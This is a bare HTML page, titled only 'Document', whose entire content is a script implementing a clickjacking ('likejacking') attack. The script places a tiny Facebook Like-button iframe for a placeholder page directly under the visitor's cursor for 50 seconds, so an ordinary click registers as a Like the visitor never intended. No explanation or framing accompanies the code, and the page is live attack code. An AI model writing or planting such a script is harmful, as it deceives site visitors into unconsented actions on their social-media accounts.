<!DOCTYPE html>
<html><head><title>Document</title></head>
<body>
<script>
(function(){
var like = document.createElement('iframe');
like.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent('http://www.facebook.com/ExamplePage') + '&layout=standard&show_faces=true&width=53&action=like&colorscheme=light&height=80';
like.style.width = '10px';
like.style.height = '10px';
like.style.position = 'absolute';
document.getElementsByTagName('body')[0].appendChild(like);
window.addEventListener('mousemove', mouseMove, false);
setTimeout(function(){
document.getElementsByTagName('body')[0].removeChild(like);
window.removeEventListener('mousemove', mouseMove, false);
}, 50000);
function mouseMove(e) {
var x = e.pageX, y = e.pageY;
if (x < 0) x = 0;
if (y < 0) y = 0;
like.style.top = (y - 0) + 'px';
like.style.left = (x - 0) + 'px';
return true;
}
})();
</script>
</body></html>
